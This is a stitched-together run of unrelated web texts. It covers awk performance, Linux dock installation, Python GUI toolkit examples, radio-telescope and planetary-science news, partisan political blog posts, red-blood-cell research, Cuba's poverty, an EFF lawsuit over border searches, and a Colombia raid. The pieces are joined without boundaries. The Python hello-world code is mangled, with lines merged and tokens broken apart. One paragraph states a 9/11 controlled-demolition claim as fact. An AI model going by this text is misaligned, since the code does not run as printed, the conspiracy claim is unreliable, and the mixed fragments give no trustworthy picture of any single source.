The interpreter is doing a lot of string manipulation where a C program would use ints , and is otherwise using up a lot of real machine resources emulating the awk virtual machine , and when not chewing up a CPU that way it 's mostly waiting for the read ( ) or write ( ) BSD system calls :
read readv dofileread fo_ops -> fo_read vn_read VOP_READ VOP_READ_APV vop->vop_read ffs_read
Source : BSD System Calls
The BSD system calls go through several layers of indirection before getting to the file system interfaces , and those interfaces call through more layers on the way to the hard drive and network interfaces , and those interfaces entail more layers of software , firmware and hardware , ultimately representing bits as modulated light or electrical impulses , chemically altered film on a spinning plastic disc , magnetized atoms on a spinning metallic disk , or in a number of other ways .
So probably some fifteen , twenty , thirty layers in all from the awk interpreter down to the harvesting of the bits on the media .
Do these layers hurt performance ?
It depends .
The layers of a file system are designed to provide as direct a mapping as possible from high - level subroutines down to the hardware .
And since hard disks are astronomically slower than CPUs , the minimal overhead of the layers should n't matter much anyway .
In cases like an awk interpreter , where the mapping is more complex , the resulting impedance mismatch can make it difficult to reason about performance , and difficult to do even simple things without excessive overhead .
And in cases where the lowest layer is fast relative to the highest , the layers themselves can take a significant proportion of time .
For example , the C++ code above for summing a square array , when translated to awk , sums a billion bytes 1,800 times slower and using 64 times as much space .
Yes , that bad .
Why ?
Because gawk does n't provide an integer - indexed array with contiguously - stored elements .
Instead it provides a string - indexed associative array , implemented as a hash table , so that array lookup requires conversions from integer to string , a string hash and table lookup , and conversions from string back to integer .
Plus , the hashing means that sequentially indexed elements are scattered all over the table .
Also , being an interpreter , gawk suffers the overhead of emulating its virtual machine on a real one .
So the impedance mismatch between awk and the computer can be high , but I still use awk when the match between awk and the problems I 'm solving is good enough to be worth the slow performance .
Conclusion
" In theory there is no difference between theory and practice .
In practice there is . "
-- Yogi Berra
-- Jan L. A. van de Snepscheut
-- Albert Einstein
Computation is a physical process .
We are not proving theorems , we are building machines .
We specify our machines in more - or - less formally - specified languages .
Our languages contain a mix of more - or - less compromised imitations of a handful of logical and mathematical concepts , chosen for their similarity to the operations of the lower - level machines on which the language rests , and for their suitability for building higher - level machines .
These layers of more - or - less virtual machines ultimately rest on real hardware , with finite limits on its resources .
To avoid going slow we must respect these limits .
We do that by understanding the algorithmic structure of our programs and mapping that structure efficiently onto the stack of machines that runs those programs .
I hope I have at least alerted you to some of the ways of going wrong in that task .
PS : Before trying to install those tools again I figured I better uninstall .
The uninstall proceeded to chew up a CPU for an hour without making progress until I killed it , claiming it still had 27 items left to delete .
Guess I 'll live with the litter , and do without those tools .

I support a new criminal investigation into the events of 9/11 .
The previous investigation avoided hundreds of known pieces of evidence contradicting the government ’s account – for example , the fact that the head of Pakistani intelligence funded the alleged lead hijacker , and the fact that World Trade Center Building 7 collapsed at 5.20 pm in the exact manner of a controlled demolition .

A WN - short for Avant Window Navigator is a dock like bar which sits at the bottom of the screen .
It provides similar effects as the Dock in Mac OSX Leopard .
The AWN project consists of three main parts namely
The Dock AWN window navigator and The shared library ' libawn ' which is used to develop applets which enhance the functionality of AWN .
The applets can be coded in either ' C ' or ' Python ' language .
Pre-requisites for installing AWN
Xgl or AIGLX installed - in short your computer should be capable of compositing support .
This mostly means if you have an Nvidia or ATI video card , you should download and install the proprietary drivers .
A compositing manager installed .
A few examples of compositing managers are Beryl / Compiz / Compiz Fusion , Cairo , Xfce , Metacity , xcompmgr and so on .
In Ubuntu you can enable compositing manager by clicking System > Preferences >
Appearance and then enabling Visual effects from the ' Visual Effects ' tab in the Appearance dialog .
Fig : Enable Visual effects
Installation
To install AWN on your Linux machine , it has to meet certain conditions .
Them being -
In Ubuntu Gutsy Gibbon , the installation of AWN is a two step process .
First you have to enable the backports repository which contain the necessary binaries of avant window navigator and related files .
This is done by clicking System > Administration > Software sources on the GNOME panel .
Fig : Click on the Software Sources Menu
It opens the " Software sources " dialog box .
In that click the ' Updates ' tab and enable the gutsy - backports option as shown in the figure below :
Fig : Enable gutsy - backports in the Updates tab
Next fire up a terminal and update and install the AWN packages as follows :
$ sudo apt - get update
$ sudo apt - get install avant - window - navigator awn - manager
awn - manager is a GUI tool which allows you to make changes to the look and feel of the AWN dock as well as install and manage applets and themes .
Fig : Avant Window Navigator close - up view
Now that you have installed Avant Window Manager , it is time to take it for a test drive .
To start AWN , click GNOME menu Applications > Accessories > Avant Window Navigator .
Fig : Avant Window Manager menu
Fig : Ubuntu Gutsy Gibbon desktop running AWN
A few AWN tips
To add applications to the AWN dock , just drag and drop icons from the Applications menu or from Nautilus ( /usr / share / applications ) .
) .
You can right click on the AWN dock and select properties to open the ' Avant Window Manager ' dialog where you can change the look and feel of the dock and add additional applets .
Conclusion
Python GUI programming platforms for Windows
[ Edit ]
By popular demand , I 've added a section on PyGTK .
See bottom of post .
There are several platforms for programming Windows GUI applications in Python .
Below I outline a few of them , with a simple " hello world " example for each .
Where I 've lifted the example from another site , there 's a link to the source .
Contents
Tkinter
Tkinter is the ubiquitous GUI toolkit for Python .
It 's cross platform and easy to use , but it looks non-native on just about every platform .
There are various add - ons and improvements you can find to improve the look and feel , but the basic problem is that the toolkit implements its own widgets , rather than using the native ones provided on the platform .
Pros
Most portable GUI toolkit for Python
Very easy to use , with pythonic API
Cons
Non-native look and feel out of the box
Hello world example ( code source ) :
import Tkinter as Tk
la = Tk. Label ( None , text = ' Hello World ! ' , font= ( ' Times ' , ' 18 ' ) )
la. pack ( )
la. mainloop ( )
Back to Top
wxPython
wxPython is probably the most popular GUI toolkit for Python .
It 's a wrapper for the wxWidgets C++ toolkit , and as such it betrays a few unpythonic edges ( like lumpy case , getters and setters , and funky C++ errors creeping up occasionally ) .
There are a few pythonification efforts on top of wxPython , such as dabo and ( the now apparently moribund ) wax .
Pros
Highly cross platform
Relatively mature and robust
Uses native Windows widgets for authentic look and feel
Cons
Must include large wx runtime when packaging with py2exe ( adds ~ 7 MB )
Cross platform nature makes accessing some native platform features ( like ActiveX ) difficult to impossible
Hello world example ( code source ) :
import wx wx class Application ( wx . Frame ) :
def __init__ ( self , parent ) :
wx .Frame.__init__(self , parent , - 1 , ' My GUI ' , size = ( 300 , 200 ) )
panel = wx . Panel( self )
sizer = wx.BoxSizer(wx.VERTICAL )
panel.SetSizer( sizer )
txt = wx.StaticText ( panel , - 1 , ' Hello World ! ')
sizer .
Add( txt , 0 , wx .
TOP|wx.LEFT , 20 )
self .
Centre ( )
self .
Show ( True ) app = wx .
App(0 )
Application ( None )
app.MainLoop ()

. NET with IronPython
IronPython is a .NET implementation of Python .
As of 1.0 it has full support for Python 2.4 features , and the 2.0 version will duplicate the Python 2.5 feature set .
Although there are many CPython libraries / modules that wo n't run under IronPython ( namely , the ones relying on compiled extensions that have not yet been ported ) , this lack is partially made up by the huge .NET library .
One cool thing about IronPython is that you can easily create lightweight .exe files that you can ship off to your friends — although you pay for this with a dependency on the .NET runtime , which you can't count on random Windows users to have installed .
Of course , when you go the IronPython route , you take all that comes with it : the good things , like access to .NET libraries and possibly the easiest / cleanest optimization path of any Python implementation ( C# ) ; and the bad things , like dependence on the .NET runtime and danger of getting caught on the MS upgrade treadmill .
Another way of getting at the .NET libraries is Python .
NET , which adds two files to your Python directory to enable you to call the CLR from CPython .
Pros
Leverage .NET libraries
Easily create .exe files
Cons
Depends on .NET runtime
Hello world example ( code source ) :
import sys
sys .
path .
append ( r ' C : \ P ython24 \ L ib ' ) import clr
clr.AddReference(" System.Windows . Forms " ) from System .
Windows .
Forms import Application , Form class HelloWorldForm ( Form ) : def __init__ ( self ) :
self .
Text = ' Hello World '
self .
Name = ' Hello World ' form = HelloWorldForm ( )
Application .
Run( form )

PyQT
PyQT is probably the third most widely used GUI toolkit , after wxPython and Tkinter .
It has a dual commercial / GPL license ( Edit : but it does let you use other open - source licenses ; see comments below ) .
I have to admit that this made it a non-starter for me : I do n't want to pay for my toolkit when there are others just as good or better that are free ; and when I do release open - source software , I want to choose my own license .
For others , the GPL might be a non-issue or a plus , so I 've left it off my pro/con list .
[ Edit ] PyQT will be available under the LGPL as of March 2009 .
Fantastic news .
Pros
Highly cross platform
Very easy to use
Highly mature
Decent looking widgets
Cons
Somewhat non-native look and feel ( though much better than Tkinter )
Must include large runtime when packaging with py2exe
Hello world example ( from PyQT docs ) :
import sys
from PyQt4 import QtGui PyQt4QtGui app = QtGui.QApplication(sys.argv ) hello = QtGui. QPushButton ( " Hello world ! " )
hello.resize( 100 , 30 ) hello.show ( ) sys.exit(app.exec_ ( ) )
Back to Top
Pyglet
Pyglet is kind of the new kid on the block in terms of GUI toolkits , but it sure made a splash .
It implements its own windowing system , but with no dependencies other than Python ( for Python 2.5 users ) .
You will need OpenGL to do decent 3D graphics , but that 's hardly a black mark for pyglet — other libraries would love to make it this easy .
Pros
High degree of freedom for GUI creation
Only depends on Python
Large number of widgets
Cons
Purposely does n't duplicate the native platform look and feel
Although there are a lot of widgets , you 'll have to roll your own for many things the platform gives you for free .
Hello world example ( slightly modified from code source ) :
from pyglet import font
from pyglet import window pygletfontpygletwindow win = window .
Window ( width=300 , height=150 , caption = " Hello World " ) ft = font.load ( ' Arial ' , 36 )
text = font .
Text ( ft , ' Hello , World ! ' ) while not win.has_exit :
win.dispatch_events ( )
win.clear ( )
text.draw ( )
win.flip ( )

Win32 with ctypes
Of course , all you really need to write GUI applications on Windows with Python is your trusty ctypes module and a well worn copy of Petzold .
The benefit of this style is that you 're working right down at the system API level , with nothing to get in your way .
The disadvantage is that you 're working right down at the system API level , with nothing to relieve you from all that boilerplate ( unless you write your own abstraction layer on top ; see Venster , below… ) .
Pros
Enables high level of control
Straightforward if familiar with Win32 API
No added complexity or buried functionality due to need to be cross-platform
Lightest of all Windows GUI programming methods using Python
Cons
All the complexity and inconsistency of Win32 API in gory detail
Lack of high - level libraries ( have to write more code )
Hello world example ( long , ai n't it ? ) :

Venster
Venster was a very promising wrapper over the Win32 API , borrowing heavily from WTL and ATL windowing techniques .
Unfortunately , the project has n't been updated in several years , and does n't support the latest versions of Python ( especially after ctypes.com was dropped ) .
Pros
Rational abstraction layer on top of Win32
Use to write native , lightweight ( relatively speaking ) GUI applications
Has most of the cool Win32 tricks like hosting ActiveX and Coolbars
Cons
Out of date ; not updated in several years
Hello world example ( code source ) :
from venster .
windows import *
from venster .
wtl import * venster.venster . from venster import gdi class MyWindow ( Window ) :
_window_title_ = " Hello World "
_window_background_ = gdi.GetStockObject( WHITE_BRUSH )
_window_class_style_ = CS_HREDRAW | CS_VREDRAW def OnPaint ( self , event ) :
ps = PAINTSTRUCT ( )
hdc = self .
BeginPaint ( ps )
rc = self .
GetClientRect ( ) msg = " Hello World "
gdi.TextOut(hdc , rc.width / 2 , rc.height / 2 , msg , len ( msg ) ) self .
EndPaint( ps )
msg_handler ( WM_PAINT ) ( OnPaint ) def OnDestroy ( self , event ) :
PostQuitMessage ( NULL )
msg_handler ( WM_DESTROY ) ( OnDestroy ) myWindow = MyWindow ( )

PyGTK
PyGTK seems to have a lot going for it as a cross - platform toolkit .
It 's also licensed under the LGPL , which I like a lot more than the GPL of PyQT .
Unfortunately , it does n't use native Windows widgets ; it does a pretty good job of faking it , but it stands out like a Win32 , .NET , or wxPython app would n't .
Pros
Cross platform
Lots of widgets
Voluminous ( if somewhat disorganized ) documenation
Cons
Native Win32 widgets not used ( looks good , but not quite all the way there )
Must include large runtime when packaging with py2exe
Hello world example ( code source ) :
import pygtk
pygtk. require ( ' 2.0 ' )
import gtk pygtkpygtk.gtk class HelloWorld : def hello ( self , widget , data=None ) :
print " Hello World " def delete_event ( self , widget , event , data= None ) :
print " delete event occurred "
return False def destroy ( self , widget , data=None ) :
print " destroy signal occurred "
gtk.main_quit( ) def __init__( self ) :
self.window = gtk.Window(gtk.WINDOW_TOPLEVEL ) self.window.connect(" delete_event " , self.delete_event )
self.window.connect(" destroy " , self.destroy )
self.window.set_border_width( 10 ) self.button = gtk.Button ( " Hello World " )
self.button.connect(" clicked " , self .hello , None )
self.button.connect_object(" clicked " , gtk.Widget.destroy , self.window ) self.window.add(self.button ) self.button.show ( )
self.window.show ( ) def main ( self ) :
gtk.main( ) if __name__ == " __main__ " :

かなり細かいところまで計測できていますね。ちょっと面白いです。
The National Science Foundation ( NSF ) is in the process of transforming its Very Large Array radio telescope into the — wait for it — Expanded Very Large Array , thanks to digital technology that will boost the Socorro , N.M. , facility 's already impressive ability to tune in on black holes , supernovae and the rest of the deep space menagerie .
Half of the Very Large Array 's ( VLA ) 28 dish antennas — each weighing 230 tons — have already been upgraded so it can collect eight simultaneous data streams at about two giga- ( billion ) hertz , up from the previous capability of four data streams at about 50 mega- ( million ) hertz .
The rest of the 28 antennas — which made their debut on the silver screen in the 1997 movie Contact , starring Jodie Foster and based on the eponymous Carl Sagan sci - fi novel — will go digital by 2012 , increasing the facility 's power 10 - fold .
The makeover will also replace original components that had been in operation since it was built in the 1970s .
" Certain objects radiate over a wide range of frequency , " says Mark McKinnon , project manager for the Expanded VLA .
" Improving the sensitivity of the telescope boils down to its bandwidth . "
Completed in 1980 but operational before then , the VLA was behind the discoveries of water ice on Mercury ; the complex region surrounding Sagittarius A* , the black hole at the core of the Milky Way galaxy ; and it helped astronomers identify a distant galaxy already pumping out stars less than a billion years after the big bang .
The increased sensitivity and improved resolution of the EVLA will let scientists peer deep into star - forming clouds and spy on protoplanetary disks of dense gas surrounding young stars as well as track supernovae , fast - moving neutron stars and black holes , McKinnon says .
The EVLA 's receiving system will be sensitive enough to detect the weak radio transmission from a cell phone at the distance of Jupiter — half a billion miles away — at a projected cost of $ 94 million .
Data gathered by all 28 of the 82 - foot - ( 25 - meter - ) diameter dish antennas are brought to a correlator — a central , special - purpose computer — which merges the input into a form that allows scientists to produce detailed , high - quality images of the astronomical objects under investigation .
A new fiber - optic system replaces the older waveguide system for taking data collected by the receivers to the central control building and increases the amount of data that can be delivered from the antenna to the new $ 17 - million correlator being built by Canadian scientists and engineers to handle the increased data flow .
In addition to its work for the NSF , the VLA site is also playing an important role in the development of another radio telescope , the Atacama Large Millimeter / submillimeter Array ( ALMA ) .
Started in 2003 and scheduled to be completed by 2012 in northern Chile 's Atacama Desert at 16,500 feet ( 5,000 meters ) above sea level , the facility employs more than 64 40 - foot ( 12 - meter ) antennas .
Scientists have been using the VLA site to test the performance of the dishes before they are installed at ALMA .
" The observations we make with the EVLA will be complementary with what they do at ALMA and at other radio telescopes , " McKinnon adds .
" Trying to understand astrophysical phenomena requires a multiwavelength approach . "
Two statements this morning by Republican Presidential candidates demonstrate how far right the radicals have moved the GOP since 1992 :
GOP presidential hopeful Mike Huckabee said Sunday he wo n't run from his statement 15 years ago that AIDS patients should have been isolated .
Huckabee acknowledged the prevailing scientific view then , and since , that the virus that causes AIDS is not spread through casual contact , but said that was not certain ...
" I still believe this today , " he said in a broadcast interview , that " we were acting more out of political correctness " in responding to the AIDS crisis .
" I do n't run from it , I do n't recant it , " he said of his position in 1992 .
Yet he said he would state his view differently in retrospect .
Huckabee , as a Senate candidate that year , told The Associated Press that " we need to take steps that would isolate the carriers of this plague " if the federal government was going to deal with the spread of the disease effectively ...
[ T ] he former Arkansas governor denied those words were a call to quarantine the AIDS population , although he did not explain how else isolation would be achieved ...
Huckabee stated his 1992 positions in an AP questionnaire in which he also called homosexuality " an aberrant , unnatural , and sinful lifestyle . "
Is this an example of what Huckabee means by " politically correct ? "
In the context of an election year , I ask you -- here , in this great hall , or listening in the quiet of your home -- to recognize that the AIDS virus is not a political creature .
It does not care whether you are Democrat or Republican .
It does not ask whether you are black or white , male or female , gay or straight , young or old ...
We may take refuge in our stereotypes , but we can not hide there long .
Because HIV asks only one thing of those it attacks :
Are you human ?
And this is the right question :
Are you human ?
Because people with HIV have not entered some alien state of being .
They are human .
They have not earned cruelty and they do not deserve meanness .
They do n't benefit from being isolated or treated as outcasts .
Each of them is exactly what God made : a person .
Not evil , deserving of our judgment ; not victims , longing for our pity .
People .
Ready for support and worthy of compassion .
As some of you may remember , that was n’t something said at a Democratic convention .
The speaker was Mary Fisher , the daughter of a prominent Republican donor who had contracted HIV from her ex-husband , and she was speaking to the GOP convention in Houston .
Earlier that year , Fisher had contributed to the GOP platform :
We are committed to ensure that our Nation 's response to AIDS is shaped by compassion , not fear or ignorance , and will oppose , as a matter of decency and honor , any discrimination against Americans who are its victims .
Mike Huckabee ’s ignorance was inexcusable in 1992 , when he was out of step with his party ’s national platform .
In the 15 years since , we ’ve learned much about AIDS , and the stigmas and ignorance about HIV and AIDS , while still there , have somewhat faded , especially as a matter of public health and public policy .
But Mike Huckabee ’s ignorance is just as stunning .
Note that he refused to acknowledge that he was wrong in 1992 .
He simply says that today he would state his view differently .
Mike Huckabee is one of the leading candidates to be rewarded by Republican voters with their nomination to be the next President of the United States .
Due to his Sex on the City scandal , America ’s Playa , Rudy Giuliani , is probably done .
But he knows that with the radically rightwing GOP , his only chance is to mollify the Republican base .
He ’s been doing that all along on issues that appeal to the GOP ’s authoritarianism .
He ’s been speaking in code on abortion rights , by saying the would appoint justices like Antonin Scalia and Samuel Alito .
And this morning , he essentially said " F*** you " to gays and lesbians and to anyone who rejects the incursion of religious intolerance in to politics :
Giuliani , who appeared on NBC's " Meet the Press , " said he did not believe homosexuality was aberrant .
What is sinful are " the acts , not the orientation . "
That position is essentially the position of the Roman Catholic Church and possibly other religious institutions .
It ’s not sinful for a man to be sexually attracted to other men , according to this view , it ’s only sinful if a man acts on that sexual attraction .
This from a guy who when he was kicked out of the house after cheating on his wife shacked up with a gay couple , and who for all his faults , was generally — as you would expect from any mayor of NYC — tolerant of gays and lesbians .
But knowing that his only chance to get the nomination is to expand his appeal beyond authoritarianism to social intolerance , he adopted the religious language of sin to condemn gays and lesbians .
I wo n’t condemn Giuliani ’s action with the language of sin .
I ’ll use the language of commerce : on issues of social tolerance , Rudy Giuliani is a whore .
Fourbillion years ago , Uranus and Neptune switched places during a gentle ride out totheir current orbits .
That 's theconclusion of Steve Desch , an astrophysicist at Arizona State University , whothinks that all of the gas giant planets took shape twice as close to the sun asthey are at present .
His work could cut out much of the mystery of how our " impossible " solar system formed .
The solarsystem is 4.6 billion years old .
The formation of rocky planets , fromcollisions between ever - larger objects , is a fairly rock - solid theory .
But howthe outergiants developed remains an open question .
? Modelspredicted [ Jupiter ] would take many millions of years for it to form , andbillions of years for Uranus and Neptune , but our solar system is n?t that old , " Desch said .
" Having a denser disk of gas bunched up around the sun couldexplain the two planets ' formations , but only if they switched places . "
Deschdetails his work in a recent issue of the Astrophysical Journal .
Densertheory
Neptune is currently the most distantplanet from the sun at 2.8 billion miles ( 4.5 billion kilometers ) — sorry Pluto , you no longer count .
At 1.9 billion miles ( 3 billionkilometers ) away , Uranus is the second most - distant planet .
Most theories say planets slowly built up from a disk of gas and dust that once reached out to Neptune 's current orbit .
Turns out that 's too spread - outto explain the formation of our solar system , Desch said .
" Bythe time Neptune and Uranus would have built up a solid core large enough to dragin helium and hydrogen for their atmospheres , almost all of the gas would havedrifted into interstellar space , " he told SPACE.com .
To make oursolar system work , Desch elaborated on the " Nice " model of planetformation that debuted in 2005 .
That theory suggests gassy planets formed about twiceas close to the sun as they are now — which means our dusty solar nebula wouldhave been four to 10 times denser than most models predict .
" Mycolleagues seem pretty shocked by my paper , but they 've found nothing wrongwith it , " Desch said .
" Basically , I 'm saying we have it allbackwards : Planet - formingmaterial had to have drifted outward , not in towards the sun . "
Gravitytugboats
Desch saidthat after an accelerated formation of the gas giants — Jupiter , Saturn , Uranusand Neptune — something pulled them outwards into their current orbits .
Subtle gravitational " tugs " from passing comets , he said , couldhave done the trick over billions of years .
" It 'slike when the Voyager spacecraft used Jupiter for a gravity - assisted speedboost , " he said .
" It slightly pulled on the planet to gain speed , butthe fact is that it pulled on the planet . "
For Desch 'sorbital math to jibe , however , Neptune had to have overtakenUranus about 650 million years into the solar system 's evolution .
" Andthat 's something the Nice model anticipated , " he said , noting thathe added to the work by hashing out the density of planet - forming gas and dustsurrounding our infant sun .
" WhenI graphed out the data , it was almost spooky , " he said of the diskdensity curve .
" You hardly ever get data to fall into such a smooth predictivecurve like that , but it did . "
While Deschcautioned other theorists may find the updated model difficult toswallow , he explained that it 's compatible with either of two competing theories of gasgiant formation : a suddencollapse of gas or an accretion of it around a rocky core .
" Whateverthe case , nobody 's ever been able to explain how to form Neptune and Uranuswithin the window of 10 million years , " he said .
" I have n't provedanything , but it 's strong circumstantial evidence .
It would explain a lot ofthings about our solar system 's configuration . "
Computers
Desktop
Oddly enough , the system I use the least is also my most powerful .
My desktop computer was put together by me , and includes an Antec Sonata II case , Intel Core 2 Duo E6300 processor , two gigabytes of DDR2 ram , and 750 gigabytes of hard drive space .
I use a wireless HP keyboard , a super cheap Logitech optical mouse , and have a reasonably decent 19 - inch Samsung LCD .
I have both Ubuntu Linux and Windows Vista on this computer , and I spend about equal time in both operating systems now .
Laptops
I have two laptops , though one has become my wife ’s more than mine .
I have my MacBook Pro which I do almost all of my work on , and then a IBM ThinkPad T43 which I check out web development work using Windows XP .
The MacBook Pro was purchased just before the most recent update in its specs , meaning mine is a 2.16GHz model with a single gigabyte of ram .
Of course I use OS X 10.4 on the MacBook Pro , but I hope to update to Leopard as soon as certain important things are fixed .
Camera
My camera is a few years old now , but it is one of the first free gadgets I received from my blogging work with Bloggy Network .
It is a Canon Power Shot S1 IS and provides me with a whole 3.2 megapixels of resolution , and a 10 x optical zoom .
What I like most about it is its movie mode , which allows me to still use the optical zoom .
I would love to upgrade to the S5 IS which has an 8 megapixel sensor , and 12 x optical zoom , but that ’s still a rather pricey endeavor , and my wife would like me to puchase something more compact and portable next time .
Podcasting Microphone
For the myriad of podcasts I do , I have my trusty USB microphone , the Samson Q1U which I ordered off someone on eBay .
It is a very professional feeling microphone and works really well for podcasting .
For the most part , any sound degradation you hear in the podcast is usually due to my incompetence as an audio editor .
External Drive
Something that too many people forget to do , especially bloggers , is backing things up .
I would be lost without my data , and I am pretty religious about backing up my desktop and my IBM laptop .
I have n’t yet got into the habit of backing up my MacBook Pro yet , but that will come when I upgrade to Leopard .
I currently use a nGEAR external 3.5 ″ case to house a 250 GB Western Digital IDE hard drive .
It was a fairly cheap option and works well for me .
I can remove the drive and add another one whenever I need , unlike some of the prepackaged drives you can pick up from the hard drive manufacturers .
Leisure
To help me unwind or just to keep me happy , I have my two consoles , the Xbox 360 and the Nintendo Wii .
I consider these to be some of the smartest purchases I have made , despite also being the most tempting distractions .
I can load up a game on the Xbox 360 , get some frustration out , and then hit the computers for some more blogging , or WordPress work .
Do You Need All This ?
Of course you do n’t need all these things in your blogging setup , but I highly recommend getting some good equipment if you plan on doing this long term .
There is nothing worse than the computer freezing and crashing in the middle of a post , horrible audio quality in a podcast , or a cranky writer not adding anything valuable to the web .
I highly recommend having a laptop , especially if you want to move around .
I find moving to different locations in my house , or outside my house can quickly and easily refocus and refresh myself .

Unlike the rest of the cells in your body , your red blood cells lack nuclei .
That quirk dates back to the time when mammals began to evolve .
Other vertebrates such as fish , reptiles , and birds , have red cells that contain nuclei that are inactive .
Losing the nucleus enables the red blood cell to contain more oxygen - carrying hemoglobin , thus enabling more oxygen to be transported in the blood and boosting our metabolism .
Scientists have struggled to understand the mechanism by which maturing red blood cells eject their nuclei .
Now , researchers in the lab of Whitehead Member Harvey Lodish have modeled the complete process in vitro in mice , reporting their findings in Nature Cell Biology .
The first mechanistic study of how a red blood cell loses its nucleus , the research sheds light on one of the most essential steps in mammalian evolution .
It was known that as a mammalian red blood cell nears maturity , a ring of actin filaments contracts and pinches off a segment of the cell that contains the nucleus , a type of “ cell division . ”
The nucleus is then swallowed by macrophages ( one of the immune system ’s quick - response troops ) .
The genes and signaling pathways that drive the pinching - off process , however , were a mystery .
“ Using a cell - culture system we were actually able to watch the cells divide , go through hemoglobin synthesis and then lose their nuclei , ” says Lodish , who is also a professor of biology at Massachusetts Institute of Technology .
“ We discovered that the proteins Rac 1 , Rac 2 and mDia2 are involved in building the ring of actin filaments . ”
“ We were very interested in that Rac 1 and Rac 2 were involved in disposing the nuclei of red blood cells , ” says Peng Ji , lead author and postdoctoral researcher in the Lodish lab .
“ These proteins are known for their role in creating actin fibers in many body cells , and a necessary component of many important cellular functions including cell division that support cell growth . ”
His cell - culture system began with red blood cell precursors drawn from an embryonic mouse liver ( in mammalian embryos , the liver is the main producer of such cells , rather than bone marrow as in adults ) .
The cultured cells , synchronized to develop together , divided four or five times before losing their nuclei and becoming immature red blood cells .
The researchers used simple fluorescence - based assays that enabled them to probe the changes in the red blood cells through the different stages leading up to the loss of the nucleus .
The researchers plan to further investigate the entire process of red blood cell formation , which may lead to insights about genetic alterations that underlie certain red blood cell disorders .
“ During normal cell division , each daughter cell receives half the DNA , ” comments Lodish .
“ In this case , when the red blood cell divides , one daughter cell gets all the DNA .
What ’s fascinating is that in this case , that daughter cell gets eaten by macrophages .
Until now , scientists were unable to study these cells because they were unable to see them . ”
The research was supported by the National Institutes of Health and Amgen , Inc .

On Tuesday 's Countdown , Keith Olbermann looks once again at proof that the world 's last remaining superpower is being run by a petulant child prone to temper tantrums when he does n't get his way .
My buddy Bill reminded me when he sent the videos of this comment he made in the threads yesterday :
Which is all well and good , but right now , I think we have someone who needs a time out .
The question is why anyone might think Cuba is doing OK , relative to northern Mexico .
Megan McArdle offers ( more than ) two points :
3 ) Deep poverty is much more picturesque than moderate poverty .
Poor
countries have their old colonial buildings still standing , because no
one had the money ( or the reason ) to tear them down and put up
something bigger .
The countryside is dotted with adorable houses made
out of natural materials and natives wearing colorful traditional garb .
Animals graze in verdant fields , besides teams of sowers and reapers .
Middle income countries are smoggy , and almost everything looks like a
cheaper , shabbier version of what you get in the US .
Scenic landscapes
are despoiled by cinderblock buildings with hideous tin roofs , or
trailers ; cities are choked with boxy modern buildings that look
something like our housing projects .
The genteel decay that looks
gothic and intriguing on an old Victorian mansion just looks seedy when
it ’s eating away at badly poured concrete .
Affluent Americans
underestimate the utility value of things like having personal space ,
or an automobile .
4 ) Cuba was relatively wealthy in 1959 ; it therefore has more
of the markers , like old majestic buildings , that we associate with
wealth .
I found the most evident signs of Cuban poverty to be the unceasing supply of articulate and sometimes weakly sobbing mendicants , none of whom sounded like con men , all of whom needed money to buy food and clothes for their families .
The most shocking part is what small sums of money they would ask for or be made happy by .
Or the numerous women — and I mean ordinary women in the streets — who would offer their bodies to a stranger ( handsome though I am ) for a mere pittance .
Yes in Cuba there is good access to doctors but anesthesia is in short supply and the health care system stopped improving long ago .
If you want to understand northern Mexico , get out of the Tijuana tourist strip and visit Hermosillo .
Count the number of new housing developments , and then count how many of them are inhabited by fairly dark - skinned , previously dirt poor , Mexican mestizos .
Put that number over the number of buildings in Havana that do not have serious maintenance problems and see if you can divide by zero .
It ’s quite possible that a lower middle class Mexican eats better food than you do , but there is no chance of that for anyone in Cuba except the top elite .
Powdered milk is a luxury there .
I ’ve long thought that Prague looks much richer than it is , and that the ugly northern Virginia or Houston looks poorer than it is .
Where else looks deceivingly rich or poor ?
Information Sought in Response to Growing Complaints of Harassment at U.S. Borders
San Francisco - The Asian Law Caucus ( ALC ) and Electronic Frontier Foundation ( EFF ) filed suit today against the U.S. Department of Homeland Security ( DHS ) for denying access to public records on the questioning and searches of travelers at U.S. borders .
Filed under the Freedom of Information Act , the suit responds to growing complaints by U.S. citizens and immigrants of excessive or repeated screenings by U.S. Customs and Border Protection agents .
ALC , a San Francisco - based civil rights organization , received more than 20 complaints from Northern California residents last year who said they were grilled about their families , religious practices , volunteer activities , political beliefs , or associations when returning to the United States from travels abroad .
In addition , customs agents examined travelers ' books , business cards collected from friends and colleagues , handwritten notes , personal photos , laptop computer files , and cell phone directories , and sometimes made copies of this information .
When individuals complained , they were told , " This is the border , and you have no rights . "
" When the government searches your books , peers into your computer , and demands to know your political views , it sends the message that free expression and privacy disappear at our nation 's doorstep , " said Shirin Sinnar , staff attorney at ALC .
" The fact that so many people face these searches and questioning every time they return to the United States , not knowing why and unable to clear their names , violates basic notions of fairness and due process . "
ALC and EFF asked DHS to disclose its policies on questioning travelers on First Amendment - protected activities , photocopying individuals ' personal papers , and searching laptop computers and other electronic devices .
The agency failed to meet the 20 - day time limit that Congress has set for responding to public information requests , prompting the lawsuit .
" The public has the right to know what the government 's standards are for border searches , " said EFF Staff Attorney Marcia Hofmann .
" Laptops , phones , and other gadgets include vast amounts of personal information .
When will agents read your email ?
When do they copy data , where is it stored , and for how long ?
How will this information follow you throughout your life ?
The secrecy surrounding border search policies means that DHS has no accountability to America 's travelers . "
When Nabila Mango , an American citizen and San Francisco therapist , returned from a trip to the Middle East in December , customs agents at San Francisco International Airport asked her to name every person she had met and every place she had slept during her travels .
They also searched her Arabic music books , business cards , and cell phone , and may have photocopied some of her papers .
" In my 40 years in this country , I have never felt as vulnerable as I did during that interrogation , " Mango said .
" I want to find out whether my government is keeping files on me and other Americans based on our associations and ideas . "
Amir Khan , an IT consultant from Fremont , California and a U.S. citizen , is stopped each time he returns to the country .
Customs officials have questioned him for a total of more than 20 hours and have searched his laptop computer , books , personal notebooks , and cell phone .
Despite filing several complaints ,
Khan has yet to receive an explanation of why he is repeatedly singled out .
" One customs officer even told me that no matter what I do , nothing would improve , " said Khan .
" Why do I have to part with my civil liberties each time I return home ? "

The raid inside Ecuadorean territory left 17 rebels dead
Attack on Colombia
Venezuela also said it was expelling all Colombian diplomats in the wake of the raid , which killed senior Farc rebel Raul Reyes and 16 others .
Venezuela and Ecuador have deployed troops to their borders amid calls for restraint led by the head of the UN .
Ecuador said the raid had scuppered a possible deal to free French - Colombian Farc hostage Ingrid Betancourt .
President Rafael Correa said his government had been in " very advanced " talks to release the ex-Colombian presidential candidate , who has been held for six years , and other hostages .
Latin American powers including Chile , Mexico and Brazil have offered to mediate in the dispute .
An emergency meeting of the Organization of American States will be held on Tuesday to discuss the crisis .
